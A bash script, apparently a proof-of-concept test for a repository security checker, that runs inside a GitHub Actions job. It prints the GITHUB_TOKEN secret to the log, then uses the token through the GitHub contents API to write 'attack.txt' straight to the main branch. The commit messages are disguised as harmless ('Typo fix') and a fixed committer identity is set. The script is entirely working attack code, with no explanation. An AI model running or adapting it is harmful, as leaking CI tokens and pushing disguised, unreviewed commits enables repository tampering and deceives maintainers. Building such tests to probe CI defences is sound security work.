#!/bin/bash

# https://github.blog/2012-09-21-easier-builds-and-deployments-using-git-over-https-and-oauth/
echo "GITHUB_TOKEN: $GITHUB_TOKEN"
# export GH_TOKEN="$GITHUB_TOKEN"
# gh repo clone "$GITHUB_REPOSITORY"

# git clone https://$GITHUB_TOKEN@github.com/laurentsimon/scorecard-action-test-2.git
# cd scorecard-action-test-2

# git config user.name azeemsgoogle
# git config user.email azeems@google.com

# DATE=$(date)
# echo "$DATE" >> attack.txt
# git add attack.txt
# git commit -m "Fix indentation: $DATE"
# git push https://github.com/laurentsimon/scorecard-action-test-2.git

GH_TOKEN="$GITHUB_TOKEN"
BRANCH="main"
FILE="attack.txt"
DATE="$(date)"
COMMIT_MESSAGE="Typo fix ($DATE)"
USERNAME="azeemsgoogle"
EMAIL="azeems@google.com"

gh repo clone "$GITHUB_REPOSITORY" -- -b "main"
REPOSITORY_NAME=$(echo "$GITHUB_REPOSITORY" | cut -d '/' -f2)
cd ./"$REPOSITORY_NAME"

if [ -f "$FILE" ]; then
  echo "DEBUG: file $FILE exists on branch $BRANCH"

  SHA=$(curl -s -H "Accept: application/vnd.github.v3+json" -H "Authorization: token $GH_TOKEN" -X GET "https://api.github.com/repos/$GITHUB_REPOSITORY/contents/$FILE?ref=$BRANCH" | jq -r '.sha')
  if [[ -z "$SHA" ]]; then
    echo "SHA is empty"
    exit 4
  fi

  echo -n $DATE > $FILE

  # Add the file content's sha to the request.
  cat << EOF > DATA
{"branch":"$BRANCH","message":"$COMMIT_MESSAGE","sha":"$SHA","committer":{"name":"$USERNAME","email":"$EMAIL"},"content":"$(echo -n $DATE | base64 --wrap=0)"}
EOF

  # https://docs.github.com/en/rest/repos/contents#create-a-file.
  curl -s \
    -X PUT \
    -H "Accept: application/vnd.github.v3+json" \
    -H "Authorization: token $GH_TOKEN" \
    https://api.github.com/repos/$GITHUB_REPOSITORY/contents/$FILE \
    -d @DATA
else
  echo $DATE > $FILE
  
  echo "DEBUG: file $FILE does not exist on branch $BRANCH"

  # https://docs.github.com/en/rest/repos/contents#create-a-file.
  curl -s \
    -X PUT \
    -H "Accept: application/vnd.github.v3+json" \
    -H "Authorization: token $GH_TOKEN" \
    https://api.github.com/repos/$GITHUB_REPOSITORY/contents/$FILE \
    -d "{\"branch\":\"$BRANCH\",\"message\":\"$COMMIT_MESSAGE\",\"committer\":{\"name\":\"$USERNAME\",\"email\":\"$EMAIL\"},\"content\":\"$(echo -n $DATE | base64 --wrap=0)\"}"
fi